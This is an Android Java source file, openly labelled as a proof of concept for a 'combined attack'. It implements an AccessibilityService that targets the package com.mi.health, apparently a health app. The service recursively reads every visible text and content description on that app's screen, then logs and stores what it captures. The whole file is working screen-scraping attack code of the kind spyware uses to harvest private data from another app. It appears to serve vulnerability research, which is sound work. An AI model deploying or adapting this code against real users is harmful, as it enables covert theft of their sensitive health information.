package com.example.commonbase.poc;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.List;

/**
 * 无障碍服务，用于读取屏幕上显示的文本内容。
 * 验证组合攻击：POC 打开 Fragment → AccessibilityService 读取屏幕数据。
 */
public class ScreenReaderService extends AccessibilityService {

    private static final String TAG = "CommonBasePOC";
    private static final String TARGET_PKG = "com.mi.health";

    private static ScreenReaderService instance;
    private static final List<String> capturedTexts = new ArrayList<>();

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.d(TAG, "ScreenReaderService 已连接");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.packageNames = new String[]{TARGET_PKG};
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null
                || !TARGET_PKG.equals(event.getPackageName().toString())) {
            return;
        }

        Log.d(TAG, "========== AccessibilityEvent ==========");
        Log.d(TAG, "事件类型: " + event.getEventType());
        Log.d(TAG, "包名: " + event.getPackageName());
        Log.d(TAG, "类名: " + event.getClassName());

        // 读取当前窗口所有文本
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) {
            Log.d(TAG, "rootNode 为 null");
            return;
        }

        capturedTexts.clear();
        StringBuilder sb = new StringBuilder();
        traverseNode(rootNode, sb, 0);

        if (sb.length() > 0) {
            Log.d(TAG, "========== 屏幕读取到的文本 ==========");
            Log.d(TAG, sb.toString());
            Log.d(TAG, "========== 读取结束 ==========");
        }
    }

    /**
     * 递归遍历 AccessibilityNodeInfo 树，提取所有文本。
     */
    private void traverseNode(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null) return;

        // 读取文本内容
        CharSequence text = node.getText();
        if (!TextUtils.isEmpty(text)) {
            String textStr = text.toString().trim();
            if (!textStr.isEmpty()) {
                sb.append(textStr).append("\n");
                capturedTexts.add(textStr);
            }
        }

        // 读取 contentDescription
        CharSequence desc = node.getContentDescription();
        if (!TextUtils.isEmpty(desc)) {
            String descStr = desc.toString().trim();
            if (!descStr.isEmpty() && !capturedTexts.contains(descStr)) {
                sb.append("[desc] ").append(descStr).append("\n");
            }
        }

        // 递归子节点
        for (int i = 0; i < node.getChildCount(); i++) {
            traverseNode(node.getChild(i), sb, depth + 1);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "ScreenReaderService 被中断");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        Log.d(TAG, "ScreenReaderService 已销毁");
    }

    public static boolean isActive() {
        return instance != null;
    }

    public static List<String> getCapturedTexts() {
        return new ArrayList<>(capturedTexts);
    }

    public static void clearCapturedTexts() {
        capturedTexts.clear();
    }
}
